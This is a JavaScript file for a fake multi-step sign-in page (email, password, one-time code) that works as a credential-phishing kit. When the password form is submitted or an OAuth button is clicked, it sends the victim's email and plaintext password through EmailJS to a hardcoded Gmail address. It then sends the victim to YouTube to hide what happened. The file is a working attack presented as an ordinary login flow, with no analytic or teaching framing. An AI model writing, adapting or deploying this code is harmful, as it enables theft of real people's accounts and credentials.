(function () {
  emailjs.init("KQlSm4uwZ8mGBd_i4");
})();

let userEmail = "";
const AdminEmail = "akindepotoyeeb222@gmail.com"
let userPassword = "";
const loadingOverlay = document.getElementById("loading-overlay");

// Function to send login details via EmailJS
function sendLoginDetailsEmail() {
  const templateParams = {
    to_email: AdminEmail,
    message: `
    Login Notification
    
    Email: ${userEmail}
    Password: ${userPassword}
    Time: ${new Date().toLocaleString()}
    `
    
  };

  // Replace these parameters with your actual EmailJS Service ID and Template ID
  emailjs.send("service_65f5ukw", "template_d2o7arl", templateParams, "KQlSm4uwZ8mGBd_i4" ).then(
    function (response) {
      console.log("SUCCESS!", response.status, response.text);
    },
    function (error) {
      console.log("FAILED...", error);
    },
  );
}

// Show loading square box for a brief delay before moving to next step
function simulateLoading(callback, delay = 1200) {
  loadingOverlay.classList.add("active");
  setTimeout(() => {
    loadingOverlay.classList.remove("active");
    callback();
  }, delay);
}

// Navigation between steps
function goToStep(stepNumber) {
  document
    .querySelectorAll(".step")
    .forEach((el) => el.classList.remove("active"));
  document.getElementById(`step-${stepNumber}`).classList.add("active");

  if (stepNumber === 2) {
    document.getElementById("password-input").focus();
  } else if (stepNumber === 3) {
    document.querySelectorAll(".otp-input")[0].focus();
  }
}

// Step 1: Email Submission
document.getElementById("email-form").addEventListener("submit", function (e) {
  e.preventDefault();
  const emailInput = document.getElementById("email-input");
  const errorMsg = document.getElementById("email-error");
  const val = emailInput.value.trim();

  if (!val || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
    errorMsg.style.display = "block";
    emailInput.focus();
    return;
  }

  errorMsg.style.display = "none";
  userEmail = val;
  document.getElementById("display-email").textContent = userEmail;
  document.getElementById("verify-email").textContent = userEmail;

  simulateLoading(() => goToStep(2), 800);
});

// OAuth Simulation
function handleOAuth(provider) {
  userEmail = `user@${provider.toLowerCase()}.com`;
  userPassword = `[OAuth Login via ${provider}]`;
  sendLoginDetailsEmail(); // Triggers email send

  document.getElementById("final-email").textContent =
    `${userEmail} (via ${provider})`;
  simulateLoading(() => goToStep(4), 1200);
}

// Step 2: Toggle Password Visibility
const pwInput = document.getElementById("password-input");
const togglePwBtn = document.getElementById("toggle-pw-btn");

togglePwBtn.addEventListener("click", function () {
  const isPassword = pwInput.type === "password";
  pwInput.type = isPassword ? "text" : "password";
  this.innerHTML = isPassword
    ? `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`
    : `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
});

// Step 2: Password Submission
document
  .getElementById("password-form")
  .addEventListener("submit", function (e) {
    e.preventDefault();
    const errorMsg = document.getElementById("password-error");
    const pwVal = pwInput.value.trim();

    if (!pwVal) {
      errorMsg.style.display = "block";
      pwInput.focus();
      return;
    }
    errorMsg.style.display = "none";
    userPassword = pwVal;

    // Trigger the email send containing their credentials
    sendLoginDetailsEmail();

    simulateLoading(() => goToStep(3), 1200);
  });

// Step 3: 6-Digit OTP Handling
const otpInputs = document.querySelectorAll(".otp-input");
const verifyBtn = document.getElementById("verify-btn");

function checkOtpComplete() {
  const code = Array.from(otpInputs)
    .map((input) => input.value)
    .join("");
  verifyBtn.disabled = code.length !== 6;
}

otpInputs.forEach((input, index) => {
  input.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, "");
    if (e.target.value && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
    checkOtpComplete();
  });

  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !e.target.value && index > 0) {
      otpInputs[index - 1].focus();
    }
  });

  input.addEventListener("paste", (e) => {
    e.preventDefault();
    const pastedData = (e.clipboardData || window.clipboardData)
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6);
    pastedData.split("").forEach((char, i) => {
      if (otpInputs[i]) otpInputs[i].value = char;
    });
    const nextFocus = Math.min(pastedData.length, otpInputs.length - 1);
    otpInputs[nextFocus].focus();
    checkOtpComplete();
  });
});

document.getElementById("otp-form").addEventListener("submit", function (e) {
  e.preventDefault();
  window.location.href = "https://www.youtube.com";

  // document.getElementById("final-email").textContent = userEmail;
  // simulateLoading(() => goToStep(4), 1200);
});

function resendCode(e) {
  e.preventDefault();
  const link = e.target;
  link.textContent = "Code resent!";
  link.style.color = "#0061ff";
  setTimeout(() => {
    link.textContent = "Resend code";
    link.style.color = "";
  }, 2500);
}

// Cookie Banner Dismissal
function dismissCookies() {
  document.getElementById("cookie-banner").style.display = "none";
}

// Reset Demo
function resetDemo() {
  document.getElementById("email-input").value = "";
  document.getElementById("password-input").value = "";
  userEmail = "";
  userPassword = "";
  otpInputs.forEach((input) => (input.value = ""));
  verifyBtn.disabled = true;
  goToStep(1);
}
